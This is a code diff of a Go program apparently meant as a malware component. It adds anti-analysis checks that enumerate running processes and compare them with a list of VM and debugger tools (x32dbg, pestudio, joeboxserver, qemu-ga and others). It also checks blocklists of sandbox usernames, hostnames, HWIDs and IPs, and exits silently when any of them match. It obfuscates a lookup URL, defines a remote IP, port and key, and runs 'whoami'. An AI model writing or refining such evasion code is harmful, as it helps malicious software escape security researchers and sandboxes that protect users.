@@ -10,10 +10,11 @@ import (
 	"os/user"
 	"net/http"
 	"io/ioutil"
+	"github.com/mitchellh/go-ps"
 )
 const (
-	IP 	 = "127.0.0.1"
-	PORT = 9090
+	IP 	 = "192.168.1.61"
+	PORT = 5050
 	KEY  = "12345"
 )
 
@@ -73,18 +74,31 @@ var process = []string {
 	"vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "xenservice.exe", "qemu-ga.exe",
 	"ksdumperclient.exe", "ksdumper.exe", "joeboxserver.exe","pestudio.exe","x32dbg.exe",
 }
+
+
+func init(){
+	go debugger()
+}
+func main(){
+	//go debugger()
+	
+	fmt.Println(system("whoami"));
+	time.Sleep(60 * time.Second)
+	
+}
+
 func trim(s string) string {
 	return strings.TrimSpace(strings.Trim(s, "\n"))
 }
 func in_array(val string, objects []string) (bool){
 	for _,value := range objects {
-	    if val == value{
+	    if strings.ToLower(val) == strings.ToLower(value){
 	    	return true
 	    }
 	}
 	return false
 }
-func anti_evasions()(bool){
+func Anti_Evasions()(bool){
 	User, err := user.Current()
   	if err != nil {
     	return true
@@ -93,26 +107,27 @@ func anti_evasions()(bool){
 	if err != nil {
 		return true
 	}
-   	if in_array(User.Username, users){ // blocked list usernames
-   		return true
-   	}
-   	if in_array(Name, computers){ // blocked list Computers
-   		return true
-   	}
-   	if in_array(trim(system(sys_hwid[runtime.GOOS])), hwids){ // blocked list hwrd (need fix)
-   		return true
-   	}
-   	if in_array(my_ip(), addrs){ // bloacked list ip
-   		return true
-   	}
-   	return false
+   	return in_array(User.Username, users) || in_array(Name, computers) || in_array(trim(system(sys_hwid[runtime.GOOS])), hwids) || in_array(get_ip(), addrs)
 }
 
-func anti_debugger()(bool){
 
+func list_Process_Anti_Debug() (bool){
+	processList, _ := ps.Processes()
+	for x := range processList {
+		var find_process ps.Process
+		find_process = processList[x]
+		
+		if in_array(find_process.Executable(), process) {
+			return true
+		}
+	}
 	return false
 }
-func my_ip()(string){
+
+func Anti_Debugger()(bool){
+	return list_Process_Anti_Debug()
+}
+func get_ip()(string){
 	url := "h" + "tt" + "ps" + "://" + "a" + "pi." + "ip" + "ify." + "org/"
 	resp, err := http.Get(url)
    	if err != nil {
@@ -164,19 +179,11 @@ func write_file(path string, context string) (string) {
 }
 func debugger(){
 	for true {
-		if anti_evasions(){
-			os.Exit(3)
+		if Anti_Evasions(){
+			os.Exit(0)
 		}
-		if anti_debugger(){
-			os.Exit(3)
+		if Anti_Debugger(){
+			os.Exit(0)
 		}
 	}
-}
-func init(){
-	go debugger()
-}
-func main(){
-	//go debugger()
-	fmt.Println(system("whoami"));
-	time.Sleep(60 * time.Second)
 }
